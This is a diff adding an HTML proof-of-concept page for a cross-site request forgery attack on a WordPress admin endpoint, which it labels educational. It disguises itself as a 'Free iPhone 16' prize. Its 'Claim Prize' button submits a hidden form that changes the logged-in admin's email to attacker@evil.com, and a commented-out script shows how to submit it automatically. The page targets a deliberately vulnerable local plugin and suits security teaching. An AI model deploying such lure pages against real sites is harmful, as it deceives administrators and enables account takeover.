@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone 16! (CSRF Demo)</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h1>🎉 Congratulations! You Won a Free iPhone 16!</h1>
+    <p>Click the button below to claim your prize!</p>
+    <button onclick="document.getElementById('csrf-form').submit();">Claim Prize!</button>
+
+    <!--
+        CSRF Attack: This hidden form will change the admin's email
+        when they click the "Claim Prize" button.
+        
+        The victim must be logged into WordPress for this to work.
+        Because the vulnerable endpoint doesn't check for a nonce,
+        the browser will automatically include the session cookies.
+    -->
+    <form id="csrf-form" class="hidden" action="http://localhost:8080/wp-admin/admin-ajax.php" method="POST">
+        <input type="hidden" name="action" value="vuln_change_email" />
+        <input type="hidden" name="email" value="attacker@evil.com" />
+    </form>
+
+    <!-- Auto-submit version (even more dangerous, no click needed): -->
+    <!--
+    <script>
+        // Uncomment to auto-submit without user interaction:
+        // document.getElementById('csrf-form').submit();
+    </script>
+    -->
+
+    <hr>
+    <p><small>This is a CSRF (Cross-Site Request Forgery) demo for educational purposes.<br>
+    The form above silently POSTs to the WordPress admin-ajax endpoint to change the admin's email.</small></p>
+</body>
+</html>
